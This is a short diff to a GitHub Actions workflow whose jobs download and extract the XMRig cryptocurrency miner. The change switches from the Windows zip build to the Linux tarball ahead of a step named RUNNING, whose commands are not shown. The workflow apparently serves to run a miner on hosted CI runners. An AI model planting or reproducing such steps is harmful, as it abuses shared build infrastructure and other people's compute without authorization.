@@ -36,9 +36,9 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: DOWNLOAD
-        run: wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-msvc-win64.zip -OutFile xmrig-6.17.0-msvc-win64.zip
+        run: wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
       - name: Extract
-        run: Expand-Archive xmrig-6.17.0-msvc-win64.zip
+        run: tar -xvf xmrig-6.17.0-linux-x64.tar.gz
         
       # Runs a set of commands using the runners shell
       - name: RUNNING
